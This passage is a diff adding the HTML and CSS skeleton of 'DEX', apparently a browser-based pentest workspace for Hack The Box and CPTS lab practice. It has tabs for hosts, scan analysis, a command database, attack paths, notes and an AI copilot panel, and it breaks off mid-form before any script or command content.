@@ -1,0 +1,2721 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>DEX — Cyber Operator Workspace</title>
+<style>
+  *{box-sizing:border-box}
+  :root{
+    --bg:#0b0e14; --panel:#12161f; --panel2:#171c28; --panel3:#0e121b;
+    --border:#232a3a; --border2:#2e3850;
+    --text:#dbe2ee; --muted:#8b93a7; --muted2:#6b7386;
+    --accent:#22d3ee; --accent-dim:#0e7490; --green:#4ade80; --amber:#fbbf24;
+    --red:#f87171; --purple:#c084fc; --orange:#fb923c;
+    --mono:ui-monospace,"Cascadia Mono","SF Mono",Consolas,"Courier New",monospace;
+    --sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+  }
+  html[data-theme="light"]{
+    --bg:#eef1f6; --panel:#ffffff; --panel2:#f3f5f9; --panel3:#e8ecf3;
+    --border:#d5dbe7; --border2:#c2cbdb;
+    --text:#1a2233; --muted:#5a6478; --muted2:#7a8499;
+    --accent:#0891b2; --accent-dim:#0e7490; --green:#15803d; --amber:#b45309;
+    --red:#b91c1c; --purple:#7e22ce; --orange:#c2410c;
+  }
+  html{scrollbar-color:#2e3850 var(--bg)}
+  body{margin:0;background:var(--bg);color:var(--text);font-family:var(--sans);line-height:1.5;font-size:15px}
+  a{color:var(--accent)}
+  h1,h2,h3{line-height:1.25;margin:0 0 8px}
+  h2{font-size:20px} h3{font-size:16px}
+  p{margin:0 0 10px}
+  .muted{color:var(--muted)} .small{font-size:13px}
+  kbd{background:var(--panel2);border:1px solid var(--border2);border-bottom-width:2px;border-radius:5px;padding:1px 6px;font-family:var(--mono);font-size:12px;color:var(--text)}
+  code{font-family:var(--mono);font-size:13px}
+  button{font-family:var(--sans);cursor:pointer}
+  input,select,textarea{font-family:var(--sans);font-size:14px;color:var(--text);background:var(--panel3);border:1px solid var(--border2);border-radius:8px;padding:8px 10px;width:100%}
+  input:focus,select:focus,textarea:focus{outline:2px solid var(--accent-dim);border-color:var(--accent)}
+  textarea{font-family:var(--mono);font-size:13px;line-height:1.5;resize:vertical}
+  .wrap{max-width:1240px;margin:0 auto;padding:0 16px}
+  .wrap-wide{max-width:1360px;margin:0 auto;padding:0 16px}
+  /* header */
+  header.top{position:sticky;top:0;z-index:40;background:var(--bg);border-bottom:1px solid var(--border)}
+  .top-in{display:flex;align-items:center;gap:12px;padding:12px 0;flex-wrap:wrap}
+  .logo{font-size:22px;font-weight:800;letter-spacing:2px}
+  .logo b{color:var(--accent)}
+  .tagline{color:var(--muted);font-size:13px}
+  .top-search{flex:1;min-width:160px;max-width:320px;margin-left:auto}
+  .top-search input{padding:8px 12px}
+  .pill{display:inline-flex;align-items:center;gap:6px;font-size:12px;border:1px solid var(--border2);border-radius:999px;padding:4px 10px;color:var(--muted);white-space:nowrap}
+  .pill .dot{width:8px;height:8px;border-radius:50%;background:var(--green)}
+  .pill.nokey .dot{background:var(--amber)}
+  .pill.host-pill{cursor:pointer}
+  .pill.host-pill:hover{border-color:var(--accent)}
+  .icon-btn{background:var(--panel);border:1px solid var(--border2);color:var(--text);border-radius:8px;padding:7px 10px;font-size:13px;display:inline-flex;align-items:center;gap:6px}
+  .icon-btn:hover{border-color:var(--accent)}
+  .icon-btn svg,.tab svg{width:14px;height:14px;vertical-align:-2px}
+  /* nav */
+  nav.tabs{display:flex;gap:8px;padding:10px 0;overflow-x:auto;scrollbar-width:none}
+  nav.tabs::-webkit-scrollbar{display:none}
+  .tab{flex:0 0 auto;background:var(--panel);border:1px solid var(--border);color:var(--text);border-radius:999px;padding:7px 13px;font-size:13.5px;display:inline-flex;align-items:center;gap:6px}
+  .tab:hover{border-color:var(--accent-dim)}
+  .tab.active{background:var(--accent);border-color:var(--accent);color:#06222a;font-weight:700}
+  html[data-theme="light"] .tab.active{color:#fff}
+  /* pages */
+  main{padding:18px 0 40px}
+  .page{display:none}
+  .page.active{display:block}
+  .page-head{margin-bottom:14px}
+  .page-head p{color:var(--muted);margin:0}
+  /* cards + grids */
+  .card{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:16px;margin-bottom:14px}
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+  .grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+  @media (max-width:820px){.grid2,.grid3{grid-template-columns:1fr}}
+  .obj-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px;margin-bottom:16px}
+  .obj-btn{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:12px 10px;text-align:left;color:var(--text)}
+  .obj-btn:hover{border-color:var(--accent-dim)}
+  .obj-btn.active{border-color:var(--accent);box-shadow:0 0 0 1px var(--accent) inset;background:var(--panel2)}
+  .obj-btn .t{font-weight:700;font-size:14px;display:block}
+  .obj-btn .d{font-size:12px;color:var(--muted);display:block;margin-top:2px}
+  .btn{display:inline-block;background:var(--accent);color:#06222a;border:1px solid var(--accent);border-radius:8px;padding:8px 14px;font-weight:700;font-size:14px}
+  html[data-theme="light"] .btn{color:#fff}
+  .btn:hover{filter:brightness(1.1)}
+  .btn-ghost{display:inline-block;background:transparent;color:var(--text);border:1px solid var(--border2);border-radius:8px;padding:8px 14px;font-size:14px}
+  .btn-ghost:hover{border-color:var(--accent)}
+  .btn-sm{padding:5px 10px;font-size:13px;border-radius:7px}
+  .btn-danger{background:transparent;color:var(--red);border:1px solid #7f2d2d}
+  .btn-armed{background:var(--red) !important;color:#fff !important;border-color:var(--red) !important}
+  .btn:disabled,.btn-ghost:disabled{opacity:.5;cursor:not-allowed}
+  .row{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+  .row .spacer{flex:1}
+  .field{margin-bottom:12px}
+  .field label{display:block;font-size:13px;color:var(--muted);margin-bottom:4px}
+  /* command cards */
+  .cmd{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:14px;margin-bottom:12px}
+  .cmd h3{margin:0 0 2px;font-size:15px}
+  .cmd .cat{font-size:11px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--accent)}
+  .cmd pre{background:var(--panel3);border:1px solid var(--border);border-radius:8px;padding:10px 12px;margin:10px 0;overflow-x:auto;white-space:pre-wrap;word-break:break-all}
+  .cmd pre code{font-size:13px;color:var(--accent)}
+  .cmd .desc{color:var(--text);margin:0 0 4px}
+  .cmd .use{color:var(--muted);font-size:13px;margin:0 0 10px}
+  .cmd .use b{color:var(--muted2);font-weight:600}
+  .copy-btn{background:var(--panel2);border:1px solid var(--border2);color:var(--text);border-radius:7px;padding:5px 11px;font-size:13px}
+  .copy-btn:hover{border-color:var(--accent)}
+  .copy-btn.done{border-color:var(--green);color:var(--green)}
+  .chip{display:inline-block;background:var(--panel2);border:1px solid var(--border2);border-radius:999px;padding:3px 10px;font-size:12px;color:var(--muted);margin:0 6px 6px 0}
+  /* workflow */
+  ol.flow{margin:8px 0 0;padding-left:22px}
+  ol.flow li{margin-bottom:6px}
+  ol.flow li::marker{color:var(--accent);font-weight:700}
+  .next-list{list-style:none;margin:8px 0 0;padding:0}
+  .next-list li{padding:7px 10px;border:1px solid var(--border);border-radius:8px;margin-bottom:6px;background:var(--panel3)}
+  .next-list li::before{content:"\2192  ";color:var(--accent);font-weight:700}
+  /* worm method */
+  .progress{height:12px;background:var(--panel3);border-radius:999px;overflow:hidden;margin:10px 0 6px}
+  .progress > i{display:block;height:100%;width:0%;background:linear-gradient(90deg,var(--accent),var(--green));border-radius:999px;transition:width .3s}
+  .worm-step{display:flex;gap:12px;align-items:flex-start;padding:12px;border:1px solid var(--border);border-radius:10px;margin-bottom:10px;background:var(--panel)}
+  .worm-step.done{border-color:var(--green)}
+  .worm-step input[type=checkbox]{width:20px;height:20px;margin-top:2px;accent-color:var(--green);flex:0 0 auto}
+  .worm-step .n{font-family:var(--mono);color:var(--accent);font-weight:700}
+  .worm-step h3{margin:0 0 2px}
+  .worm-step p{margin:0;color:var(--muted);font-size:13px}
+  /* chains + attack tree */
+  details.chain{background:var(--panel);border:1px solid var(--border);border-radius:12px;margin-bottom:12px;overflow:hidden}
+  details.chain summary{cursor:pointer;padding:14px 16px;font-weight:700;list-style:none}
+  details.chain summary::-webkit-details-marker{display:none}
+  details.chain summary::before{content:"\25B8  ";color:var(--accent)}
+  details.chain[open ] summary::before{content:"\25BE  "}
+  details.chain summary:hover{background:var(--panel2)}
+  .chain-body{padding:0 16px 16px}
+  .node{border:1px solid var(--border2);border-left:3px solid var(--accent);border-radius:8px;padding:10px 12px;background:var(--panel3);margin-bottom:4px}
+  .node b{font-size:14px}
+  .node p{margin:2px 0 0;color:var(--muted);font-size:13px}
+  .node-arrow{text-align:center;color:var(--accent);font-size:18px;line-height:1.2}
+  ul.tree{list-style:none;margin:0;padding-left:18px}
+  ul.tree > li{position:relative;padding:6px 0 6px 14px;border-left:2px solid var(--border2)}
+  ul.tree > li::before{content:"";position:absolute;left:-2px;top:16px;width:12px;height:2px;background:var(--border2)}
+  .tree-node{display:inline-block;background:var(--panel3);border:1px solid var(--border2);border-radius:8px;padding:7px 11px;font-size:13.5px}
+  .tree-node b{color:var(--accent)}
+  .tree-node .sub{color:var(--muted);font-size:12px}
+  .tree-root > .tree-node{border-color:var(--accent);font-size:14px}
+  /* scan */
+  .scan-wrap{display:grid;grid-template-columns:minmax(280px,1fr) 1fr;gap:14px;align-items:start}
+  @media (max-width:820px){.scan-wrap{grid-template-columns:1fr}}
+  .scan-preview{background:var(--panel3);border:1px solid var(--border);border-radius:8px;padding:12px;min-height:200px;max-height:420px;overflow:auto;white-space:pre-wrap;word-break:break-word;font-family:var(--mono);font-size:12.5px;line-height:1.5;margin:0}
+  .hl-ip{color:#7dd3fc;font-weight:600}
+  html[data-theme="light"] .hl-ip{color:#0369a1}
+  .hl-port{color:var(--amber);font-weight:600}
+  .hl-kw{color:var(--green);font-weight:600}
+  .detect-card{background:var(--panel);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:10px;padding:12px;margin-bottom:10px}
+  .detect-card h4{margin:0 0 4px;font-size:14px}
+  .detect-card p{margin:0 0 8px;color:var(--muted);font-size:13px}
+  .detect-card code{font-size:12.5px}
+  .pri-badge{display:inline-block;font-size:11px;font-weight:800;letter-spacing:.5px;border-radius:999px;padding:2px 9px;margin-right:8px;vertical-align:1px}
+  .pri-1{background:#7f1d1d;color:#fecaca}
+  .pri-2{background:#78350f;color:#fde68a}
+  .pri-3{background:#134e4a;color:#99f6e4}
+  html[data-theme="light"] .pri-1{background:#fecaca;color:#7f1d1d}
+  html[data-theme="light"] .pri-2{background:#fde68a;color:#78350f}
+  html[data-theme="light"] .pri-3{background:#99f6e4;color:#134e4a}
+  .resize-x{resize:horizontal;overflow:auto;min-width:240px;max-width:100%}
+  /* vault / evidence / loot */
+  .vault-item{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:14px;margin-bottom:12px}
+  .vault-item h3{margin:0 0 4px}
+  .vault-item .meta{color:var(--muted);font-size:13px;margin-bottom:8px}
+  .vault-item .lbl{color:var(--muted2);font-size:12px;text-transform:uppercase;letter-spacing:.5px}
+  .vault-item p{margin:0 0 8px;font-size:14px}
+  .diff-Easy{color:var(--green)} .diff-Medium{color:var(--amber)} .diff-Hard{color:var(--orange)} .diff-Insane{color:var(--red)}
+  .sev-Critical{color:var(--red);font-weight:700} .sev-High{color:var(--orange);font-weight:700}
+  .sev-Medium{color:var(--amber);font-weight:700} .sev-Low{color:var(--green);font-weight:700} .sev-Info{color:var(--muted);font-weight:700}
+  .sev-badge{display:inline-block;font-size:11px;font-weight:800;letter-spacing:.5px;border-radius:999px;padding:2px 9px;border:1px solid var(--border2)}
+  .sev-badge.Critical{color:var(--red);border-color:var(--red)}
+  .sev-badge.High{color:var(--orange);border-color:var(--orange)}
+  .sev-badge.Medium{color:var(--amber);border-color:var(--amber)}
+  .sev-badge.Low{color:var(--green);border-color:var(--green)}
+  .sev-badge.Info{color:var(--muted)}
+  /* notes */
+  .notes-wrap{display:grid;grid-template-columns:280px 1fr;gap:14px;align-items:start}
+  @media (max-width:820px){.notes-wrap{grid-template-columns:1fr}}
+  .note-list-item{display:block;width:100%;text-align:left;background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:10px 12px;margin-bottom:8px;color:var(--text)}
+  .note-list-item:hover{border-color:var(--accent-dim)}
+  .note-list-item.active{border-color:var(--accent);background:var(--panel2)}
+  .note-list-item .t{font-weight:700;font-size:14px;display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  .note-list-item .d{font-size:12px;color:var(--muted)}
+  .md-preview h1,.md-preview h2,.md-preview h3{margin:14px 0 6px}
+  .md-preview h1{font-size:20px}.md-preview h2{font-size:17px}.md-preview h3{font-size:15px}
+  .md-preview pre{background:var(--panel3);border:1px solid var(--border);border-radius:8px;padding:10px;overflow-x:auto}
+  .md-preview pre code{color:var(--accent)}
+  .md-preview code{background:var(--panel3);border:1px solid var(--border);border-radius:4px;padding:1px 5px}
+  .md-preview blockquote{border-left:3px solid var(--accent);margin:8px 0;padding:4px 12px;color:var(--muted)}
+  .md-preview ul,.md-preview ol{padding-left:22px}
+  .md-preview hr{border:0;border-top:1px solid var(--border);margin:14px 0}
+  .md-preview table{border-collapse:collapse;margin:10px 0}
+  .md-preview th,.md-preview td{border:1px solid var(--border2);padding:5px 10px;font-size:13px;text-align:left}
+  /* workspace overview + hosts */
+  .ws-grid{display:grid;grid-template-columns:300px 1fr;gap:14px;align-items:start}
+  @media (max-width:900px){.ws-grid{grid-template-columns:1fr}}
+  .count-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:10px;margin-bottom:14px}
+  .count-card{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:12px}
+  .count-card .n{font-size:24px;font-weight:800;color:var(--accent);line-height:1.1}
+  .count-card .l{font-size:12px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px}
+  .host-item{display:block;width:100%;text-align:left;background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:10px 12px;margin-bottom:8px;color:var(--text)}
+  .host-item:hover{border-color:var(--accent-dim)}
+  .host-item.active{border-color:var(--accent);background:var(--panel2)}
+  .host-item .t{font-weight:700;font-size:14px;display:block;font-family:var(--mono)}
+  .host-item .d{font-size:12px;color:var(--muted);display:block}
+  .status-dot{display:inline-block;width:9px;height:9px;border-radius:50%;margin-right:5px;vertical-align:0}
+  .st-Active{background:var(--green)} .st-Down{background:var(--muted2)}
+  .st-Compromised{background:var(--amber)} .st-Rooted{background:var(--red)}
+  .svc-tag{display:inline-block;background:var(--panel2);border:1px solid var(--border2);border-radius:6px;padding:2px 8px;font-family:var(--mono);font-size:12px;margin:0 5px 5px 0}
+  .feed-item{padding:8px 0;border-bottom:1px solid var(--border);font-size:13.5px}
+  .feed-item:last-child{border-bottom:0}
+  .feed-item .ts{color:var(--muted2);font-size:12px;font-family:var(--mono)}
+  /* AI panel */
+  #aiToggle{position:fixed;right:16px;bottom:16px;z-index:55;background:var(--accent);color:#06222a;border:0;border-radius:999px;padding:11px 18px;font-weight:800;font-size:14px;box-shadow:0 4px 18px rgba(34,211,238,.35)}
+  html[data-theme="light"] #aiToggle{color:#fff}
+  @media (max-width:600px){#aiToggle{bottom:72px;right:12px;padding:9px 14px;font-size:13px}}
+  #aiPanel{position:fixed;top:0;right:0;height:100dvh;width:min(430px,100vw);background:var(--panel);border-left:1px solid var(--border2);transform:translateX(105%);transition:transform .25s ease;z-index:60;display:flex;flex-direction:column}
+  #aiPanel.open{transform:none}
+  .ai-head{display:flex;align-items:center;gap:10px;padding:14px 16px;border-bottom:1px solid var(--border)}
+  .ai-head h2{margin:0;font-size:16px}
+  .ai-key{padding:12px 16px;border-bottom:1px solid var(--border)}
+  .ai-key .row{margin-top:8px}
+  .ai-status{font-size:12px;color:var(--muted);margin-top:6px}
+  .ai-ctx{padding:10px 16px;border-bottom:1px solid var(--border);background:var(--panel3);font-size:12.5px;color:var(--muted)}
+  .ai-ctx b{color:var(--text)}
+  .ai-ctx .ctx-line{margin:2px 0}
+  .ai-qa{display:flex;flex-wrap:wrap;gap:6px;padding:12px 16px;border-bottom:1px solid var(--border)}
+  .qa-btn{background:var(--panel2);border:1px solid var(--border2);color:var(--text);border-radius:999px;padding:5px 11px;font-size:12.5px}
+  .qa-btn:hover{border-color:var(--accent)}
+  #aiLog{flex:1;overflow-y:auto;padding:14px 16px;display:flex;flex-direction:column;gap:10px}
+  .msg{max-width:92%;padding:10px 12px;border-radius:12px;font-size:14px;line-height:1.5;white-space:pre-wrap;word-break:break-word}
+  .msg.user{align-self:flex-end;background:var(--accent-dim);color:#e0f7ff;border-bottom-right-radius:4px}
+  .msg.ai{align-self:flex-start;background:var(--panel2);border:1px solid var(--border2);border-bottom-left-radius:4px}
+  .msg.ai pre{background:var(--panel3);border:1px solid var(--border);border-radius:8px;padding:8px;overflow-x:auto}
+  .msg.ai pre code{color:var(--accent)}
+  .msg.ai code{background:var(--panel3);border:1px solid var(--border);border-radius:4px;padding:1px 5px}
+  .msg.err{align-self:flex-start;background:#2a1215;border:1px solid #7f2d2d;color:#fca5a5;border-bottom-left-radius:4px}
+  html[data-theme="light"] .msg.err{background:#fee2e2;color:#7f1d1d}
+  .ai-composer{display:flex;gap:8px;padding:12px 16px;border-top:1px solid var(--border)}
+  .ai-composer textarea{flex:1;min-height:44px;max-height:140px}
+  /* command palette */
+  #palette{position:fixed;inset:0;z-index:80;background:rgba(0,0,0,.55);display:none;align-items:flex-start;justify-content:center;padding:12vh 16px 16px}
+  #palette.open{display:flex}
+  .palette-box{width:min(620px,100%);background:var(--panel);border:1px solid var(--border2);border-radius:14px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.5)}
+  .palette-box input{border:0;border-radius:0;padding:14px 16px;font-size:16px;background:var(--panel)}
+  .palette-box input:focus{outline:none}
+  #paletteList{max-height:50vh;overflow-y:auto;border-top:1px solid var(--border)}
+  .pal-item{display:flex;gap:10px;align-items:center;width:100%;text-align:left;background:transparent;border:0;border-bottom:1px solid var(--border);color:var(--text);padding:10px 16px;font-size:14px}
+  .pal-item.sel{background:var(--panel2)}
+  .pal-item .k{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;min-width:64px}
+  .pal-item .s{color:var(--muted);font-size:12px;margin-left:auto;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:45%}
+  /* toasts */
+  #toasts{position:fixed;left:16px;bottom:16px;z-index:90;display:flex;flex-direction:column;gap:8px}
+  .toast{background:var(--panel2);border:1px solid var(--border2);border-left:3px solid var(--accent);border-radius:10px;padding:10px 14px;font-size:13.5px;box-shadow:0 6px 20px rgba(0,0,0,.35);max-width:340px}
+  .toast.ok{border-left-color:var(--green)}
+  .toast.err{border-left-color:var(--red)}
+  /* footer */
+  footer{border-top:1px solid var(--border);padding:20px 0 60px;color:var(--muted);font-size:13px}
+  footer table{border-collapse:collapse}
+  footer td{padding:3px 12px 3px 0;vertical-align:top}
+  .empty{color:var(--muted);border:1px dashed var(--border2);border-radius:10px;padding:18px;text-align:center}
+  .hidden{display:none !important}
+  .report-pre{background:var(--panel3);border:1px solid var(--border);border-radius:8px;padding:14px;max-height:480px;overflow:auto}
+</style>
+</head>
+<body>
+
+<header class="top">
+  <div class="wrap-wide top-in">
+    <div>
+      <div class="logo">DEX<b>.</b></div>
+      <div class="tagline">Cyber Operator Workspace &mdash; decision support for HTB, CPTS &amp; pentest labs</div>
+    </div>
+    <div class="top-search">
+      <input id="globalSearch" type="search" placeholder="Search commands&hellip;  (Ctrl+K)" autocomplete="off" aria-label="Search commands">
+    </div>
+    <button class="pill host-pill" id="currentHostPill" type="button" title="Current host — click to open the Workspace"><span class="status-dot st-Down" id="currentHostDot"></span><span id="currentHostText">No host selected</span></button>
+    <span class="pill nokey" id="keyPill" title="Gemini API key status"><span class="dot"></span><span id="keyPillText">AI: no key</span></span>
+    <button class="icon-btn" id="themeBtn" type="button" title="Toggle dark / light theme"></button>
+    <button class="icon-btn" id="paletteBtn" type="button" title="Command palette (Ctrl+P)">&#8984;P &nbsp;Palette</button>
+    <button class="btn btn-sm" id="openAiBtn" type="button">AI Copilot</button>
+  </div>
+  <div class="wrap-wide">
+    <nav class="tabs" id="tabs" aria-label="Sections">
+      <button class="tab active" data-page="workspace" type="button">Workspace</button>
+      <button class="tab" data-page="dashboard" type="button">Mission Dashboard</button>
+      <button class="tab" data-page="worm" type="button">Worm Method</button>
+      <button class="tab" data-page="commands" type="button">Command Database</button>
+      <button class="tab" data-page="chains" type="button">Attack Path</button>
+      <button class="tab" data-page="scan" type="button">Scan Analysis</button>
+      <button class="tab" data-page="vault" type="button">HTB Vault</button>
+      <button class="tab" data-page="evidence" type="button">Evidence</button>
+      <button class="tab" data-page="loot" type="button">Loot Locker</button>
+      <button class="tab" data-page="notes" type="button">Personal Notes</button>
+      <button class="tab" data-page="report" type="button">Report</button>
+    </nav>
+  </div>
+</header>
+
+<main class="wrap-wide">
+
+  <!-- ============ 0. WORKSPACE OVERVIEW + HOSTS ============ -->
+  <section class="page active" id="sec-workspace">
+    <div class="page-head">
+      <h2>Workspace</h2>
+      <p>Asset-centric home base. Hosts are the primary object &mdash; everything (scans, credentials, findings, loot) hangs off the host you are working on. Nothing is seeded: add your first host to start.</p>
+    </div>
+    <div class="count-grid" id="wsCounts"></div>
+    <div class="ws-grid">
+      <div>
+        <div class="card">
+          <h3>Hosts</h3>
+          <div id="hostList"></div>
+        </div>
+        <div class="card">
+          <h3 id="hostFormTitle">Add a host</h3>
+          <div class="field"><label for="hIp">Host / IP *</label><input id="hIp" type="text" placeholder="e.g. 10.10.10.5" autocomplete="off"></div>
+          <div class="field"><label for="hName">Name</label><input id="hName" type="text" placeholder="e.g. machine name (optional)" autocomplete="off"></div>
+          <div class="grid2">
+            <div class="field"><label for="hStatus">Status</label>
+              <select id="hStatus"><option>Active</option><option>Down</option><option>Compromised</option><option>Rooted</option></select>
+            </div>
+            <div class="field"><label for="hFoothold">Foothold</label>
+              <select id="hFoothold"><option value="none">Not obtained</option><option value="creds">Credentials</option><option value="shell">Shell obtained</option></select>
+            </div>
+          </div>
+          <div class="field"><label for="hPrivesc">Privilege escalation</label>
+            <select id="hPrivesc"><option value="none">None</option><option value="user">User</option><option value="root">Root / SYSTEM</option></select>
+          </div>
+          <div class="field"><label for="hServices">Services (optional, comma separated port/service)</label><input id="hServices" type="text" placeholder="e.g. 22/ssh, 80/http, 445/smb" autocomplete="off"></div>
+          <div class="row">
+            <button class="btn" id="hSave" type="button">Save host</button>
+            <button class="btn-ghost hidden" id="hCancelEdit" type="button">Cancel edit</button>
+            <span class="muted small" id="hMsg"></span>
+          </div>
+        </div>
+      </div>
+      <div>
+        <div class="card" id="wsCurrentHostCard">
+          <h3>Current host</h3>
+          <div id="wsCurrentHost"><p class="muted">No host selected. Add a host on the left, or click one in the list to make it current everywhere (scan context, AI context, attack path).</p></div>
+        </div>
+        <div class="card">
+          <div class="row">
+            <h3 style="margin:0">Activity</h3>
+            <span class="spacer"></span>
+            <button class="btn-ghost btn-sm" id="activityClear" type="button">Clear</button>
+          </div>
+          <div id="activityList" style="margin-top:8px"></div>
+        </div>
+        <div class="card">
+          <h3>Quick actions</h3>
+          <div class="row">
+            <button class="btn btn-sm" id="qaReport" type="button">Generate Assessment Notes</button>
+            <button class="btn-ghost btn-sm" id="qaScan" type="button">Open Scan Analysis</button>
+            <button class="btn-ghost btn-sm" id="qaEvidence" type="button">New Evidence Note</button>
+            <button class="btn-ghost btn-sm" id="qaLoot" type="button">Open Loot Locker</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 1. MISSION DASHBOARD ============ -->
+  <section class="page" id="sec-dashboard">
+    <div class="page-head">
+      <h2>Mission Dashboard</h2>
+      <p>Pick your current objective. DEX shows only the commands, workflow, and next actions for that phase &mdash; so you always know what to do next. If you have pasted scan output, DEX also builds prioritized recommendations from the detected services below.</p>
+    </div>
+    <div class="card" id="dynRecsCard">
+      <h3>Recommended from your scan</h3>
+      <div id="dynRecs"><p class="muted">No scan data yet. Paste Nmap output in Scan Analysis, or add services to the current host, and prioritized enumeration paths will appear here.</p></div>
+    </div>
+    <div class="obj-grid" id="objGrid" role="group" aria-label="Objectives"></div>
+    <div class="grid2">
+      <div class="card">
+        <h3>Current Objective: <span id="objTitle">Reconnaissance</span></h3>
+        <h3 class="small muted" style="margin-top:12px">RECOMMENDED WORKFLOW</h3>
+        <ol class="flow" id="objWorkflow"></ol>
+        <h3 class="small muted" style="margin-top:14px">SUGGESTED NEXT ACTIONS</h3>
+        <ul class="next-list" id="objNext"></ul>
+      </div>
+      <div>
+        <h3 class="small muted" style="margin:2px 0 8px">COMMANDS FOR THIS OBJECTIVE</h3>
+        <div id="objCommands"></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 2. WORM METHOD WORKFLOW ============ -->
+  <section class="page" id="sec-worm">
+    <div class="page-head">
+      <h2>Worm Method</h2>
+      <p>Five phases, in order. Check each one off as you finish it &mdash; progress is saved in this browser and survives a reload.</p>
+    </div>
+    <div class="card">
+      <div class="row">
+        <h3 style="margin:0">Progress</h3>
+        <span class="spacer"></span>
+        <span id="wormText" class="muted">0 / 5 complete</span>
+        <button class="btn-ghost btn-sm" id="wormReset" type="button">Reset</button>
+      </div>
+      <div class="progress" aria-label="Worm Method progress"><i id="wormBar"></i></div>
+      <div id="wormSteps"></div>
+    </div>
+    <div class="card">
+      <h3>How to use it</h3>
+      <p class="muted">Work the phases in order. If you get stuck on a phase, switch to the Mission Dashboard and pick the matching objective &mdash; it will show the exact commands for that step. Come back here and tick the phase off when it is done.</p>
+    </div>
+  </section>
+
+  <!-- ============ 3. COMMAND DATABASE ============ -->
+  <section class="page" id="sec-commands">
+    <div class="page-head">
+      <h2>Command Database</h2>
+      <p>Real, standard commands only. Every entry has a copy button, an explanation, and a use case. <b>For Hack The Box lab machines and systems you have permission to test only.</b></p>
+    </div>
+    <div class="row" id="catChips" style="margin-bottom:14px" role="group" aria-label="Filter by category"></div>
+    <div id="cmdList"></div>
+  </section>
+
+  <!-- ============ 4. ATTACK PATH (dynamic tree) ============ -->
+  <section class="page" id="sec-chains">
+    <div class="page-head">
+      <h2>Attack Path</h2>
+      <p>Built from your current host's real data &mdash; services, findings, credentials, and access. When no host is selected (or it has no data yet), the example paths below are shown instead, clearly labeled.</p>
+    </div>
+    <div id="chainList"></div>
+  </section>
+
+  <!-- ============ 5. SCAN ANALYSIS WORKSPACE ============ -->
+  <section class="page" id="sec-scan">
+    <div class="page-head">
+      <h2>Scan Analysis Workspace</h2>
+      <p>Paste tool output below. DEX detects open ports, suggests what to try next, and builds prioritized recommendations. Send it to the AI Copilot together with your current host and section context.</p>
+    </div>
+    <div class="card">
+      <div class="row" style="margin-bottom:10px">
+        <span class="muted small">Current Host: <b id="scanHost" style="color:var(--text)">None selected</b></span>
+        <span class="muted small">&middot; Current Section: <b id="scanContext" style="color:var(--text)">Reconnaissance</b></span>
+        <span class="spacer"></span>
+        <button class="btn-ghost btn-sm" id="addServicesBtn" type="button" title="Save the detected services onto the current host">Add services to current host</button>
+        <button class="btn-ghost btn-sm" id="scanClear" type="button">Clear</button>
+        <button class="btn btn-sm" id="sendScanBtn" type="button">Send To AI &nbsp;(Ctrl+Enter)</button>
+      </div>
+      <div class="scan-wrap">
+        <div class="resize-x">
+          <label class="small muted" for="scanInput">Paste Nmap, Gobuster, Feroxbuster, Nikto, LinPEAS, or WinPEAS output</label>
+          <textarea id="scanInput" rows="14" placeholder="Starting Nmap 7.94 ( https://nmap.org ) at ...&#10;PORT     STATE SERVICE&#10;22/tcp   open  ssh&#10;80/tcp   open  http&#10;..."></textarea>
+        </div>
+        <div>
+          <label class="small muted">Highlighted preview</label>
+          <pre class="scan-preview" id="scanPreview">Paste output on the left to see it highlighted here.</pre>
+          <div style="margin-top:14px">
+            <h3 class="small muted" style="margin-bottom:8px">DETECTED SERVICES &amp; NEXT STEPS</h3>
+            <div id="scanDetections"><p class="muted small">Nothing detected yet.</p></div>
+          </div>
+          <div style="margin-top:14px">
+            <h3 class="small muted" style="margin-bottom:8px">PRIORITIZED PATHS</h3>
+            <div id="scanRecs"><p class="muted small">Paste a scan to see prioritized enumeration paths.</p></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 6. HTB KNOWLEDGE VAULT ============ -->
+  <section class="page" id="sec-vault">
+    <div class="page-head">
+      <h2>HTB Knowledge Vault</h2>
+      <p>Your completed machines, in your own words. Stored only in this browser &mdash; nothing leaves your device.</p>
+    </div>
+    <div class="card">
+      <h3 id="vaultFormTitle">Add a machine</h3>
+      <div class="grid2">
+        <div class="field"><label for="vName">Box Name</label><input id="vName" type="text" placeholder="e.g. machine name" autocomplete="off"></div>
+        <div class="field"><label for="vDiff">Difficulty</label>
+          <select id="vDiff"><option>Easy</option><option>Medium</option><option>Hard</option><option>Insane</option></select>
+        </div>
+        <div class="field"><label for="vPlat">Platform</label>
+          <select id="vPlat"><option>Hack The Box</option><option>TryHackMe</option><option>Proving Grounds</option><option>VulnHub</option><option>Other</option></select>
+        </div>
+        <div class="field"><label for="vFoothold">Initial Foothold</label><input id="vFoothold" type="text" placeholder="How did you get in?" autocomplete="off"></div>
+        <div class="field"><label for="vPrivesc">PrivEsc Method</label><input id="vPrivesc" type="text" placeholder="How did you escalate?" autocomplete="off"></div>
+        <div class="field"><label for="vLessons">Lessons Learned</label><textarea id="vLessons" rows="3" placeholder="What will you do differently next time?"></textarea></div>
+      </div>
